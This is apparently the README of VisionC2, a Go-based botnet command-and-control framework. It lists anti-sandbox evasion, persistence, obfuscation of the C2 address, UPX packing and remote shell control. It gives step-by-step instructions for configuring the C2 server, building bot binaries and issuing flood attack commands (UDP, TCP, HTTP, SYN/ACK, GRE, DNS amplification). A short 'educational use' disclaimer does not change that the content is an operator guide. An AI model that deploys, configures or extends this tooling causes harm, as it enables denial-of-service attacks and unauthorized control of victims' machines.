# VisionC2 – Go Based Botnet Command & Control (C2) Framework

![VisionC2 Banner](https://img.shields.io/badge/VisioNNet-V3-red)
![Go Version](https://img.shields.io/badge/Go-1.21+-blue)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-green)

**VisionC2** is an upgraded fork of [BotnetGo](https://github.com/1Birdo/BotnetGo.git) bringing new Anti Sandbox, TLS Encryption + HMAC Bot Auth, String Hiding, and more to come .

> **Credit:** This project is based upon the incredible work of [1birdo](https://github.com/1Birdo) in the [BotnetGo](https://github.com/1Birdo/BotnetGo.git) project. Many of VisionC2's foundations come directly from that repository.

---

## ⚡ Features

### C2 Server

- **TLS Encryption:** Secure bot-to-server communications
- **Multi-User, Role-Based Auth:** Support for multiple admins/operators
- **Real-Time Bot Management:** Live monitoring and control
- **Centralized Attack Coordination:** Issue simultaneous botnet commands
- **Persistence Handling:** Tracks and handles bot reconnections

### Bot Client

- **14+ CPU Architectures Supported**
- **Anti-Sandboxing:** Multi-stage detection/evasion
- **Persistence Mechanisms:** Multi-layered survival
- **Remote Shell Execution:** Detach, stream, or normal shell execution
- **Attack Capabilities**:
  - UDP / TCP Flood
  - HTTP Flood
  - SYN / ACK Flood
  - DNS Amplification
  - GRE Flood
  - HTTPS/CF/TLS BYPASS (WIP)

---

## 🔧 Prerequisites

### Requirements

- **Go 1.21+** (build from source)
- **UPX:** For binary compression
- **OpenSSL:** For TLS certificate creation
- **NoMoreUPX** (recommended): [UPX string removal](https://github.com/Syn2Much/upx-stripper)

### Install Dependencies

#### Ubuntu / Debian

```bash
sudo apt update
sudo apt install -y golang-go upx-ucl openssl git
```

#### CentOS / RHEL

```bash
sudo yum install -y golang upx openssl git
```

---

## 📜 TLS Certificate Setup

VisionC2 requires TLS certificates to secure bot communication.

### Option A: Self-Signed Certificate (Dev/Testing)

```bash
openssl genrsa -out server.key 2048
openssl req -new -key server.key -out server.csr -subj "/C=US/ST=State/L=City/O=Organization/CN=localhost"
openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt
chmod 600 server.key
chmod 644 server.crt
```

### Option B: Let’s Encrypt (Production)

```bash
sudo apt install certbot
sudo certbot certonly --standalone -d yourdomain.com
```

Certificates will appear in:  
`/etc/letsencrypt/live/yourdomain.com/`

---

## 🚀 Quick Start

### 1. Clone the Repository

```bash
git clone https://github.com/Syn2Much/VisionC2.git
cd VisionC2
```

### 2. Configure the C2 Server

Edit `cnc/main.go`:

```go
const (
    USER_SERVER_IP   = "YOUR_SERVER_IP"
    BOT_SERVER_IP    = "YOUR_SERVER_IP"
    USER_SERVER_PORT = "420"
    BOT_SERVER_PORT  = "443"
)
```

Update protocol settings:

```go
const (
    MAGIC_CODE       = "CHANGE_ME"
    PROTOCOL_VERSION = "v1.0"
)
```

### 3. Configure the Bot

Edit `bot/main.go`:

```go
const gothTits = "OBFUSCATED_C2_STRING"
```

Generate the obfuscated string:

```bash
python3 tools/obfuscate_c2.py "YOUR_C2_IP:443"
```

Replace both `gothTits` and `requestMore()` with the output.

### 4. Build Bot Binaries

```bash
cd bot
chmod +x build.sh
./build.sh
```

### 5. Run the C2 Server

```bash
cd cnc
go run .
```

A default `users.json` will be created on the first run.

### 6. Connect to the Admin Interface

```bash
nc YOUR_SERVER_IP 420
# or
telnet YOUR_SERVER_IP 420
```

> Enter your secret key (e.g., `spamtec`) to trigger the login screen—change `spamtec` to any secret string in main.go under `MAGIC_CODE`.

---

## 🛠️ Admin Commands

### Bot Management

```
bots           # List bots
!info          # More info
!persist       # Persistence control
!reinstall     # Force reinstall
!lolnogtfo     # Remove/uninstall
```

### Attack Commands

```
!udpflood <ip> <port> <time>
!tcpflood <ip> <port> <time>
!http <ip> <port> <time>
!syn <ip> <port> <time>
!ack <ip> <port> <time>
!gre <ip> <port> <time>
!dns <ip> <port> <time>
```

### System / Shell

```
!shell <cmd>
!stream <cmd>
!detach <cmd>
clear   | cls
help    | ?
ongoing
logout  | exit
```

---

## ⚖️ Legal & Ethical Notice

This software is for **educational and authorized security research only**.

By using VisionC2 you agree to:

1. Obtain explicit permission before testing or deployment
2. Follow all applicable laws
3. Take full responsibility for any use of the code
4. Never use for malicious or unauthorized purposes

---

## 📧 Contact

[dev@sinners.city](mailto:dev@sinners.city)

---
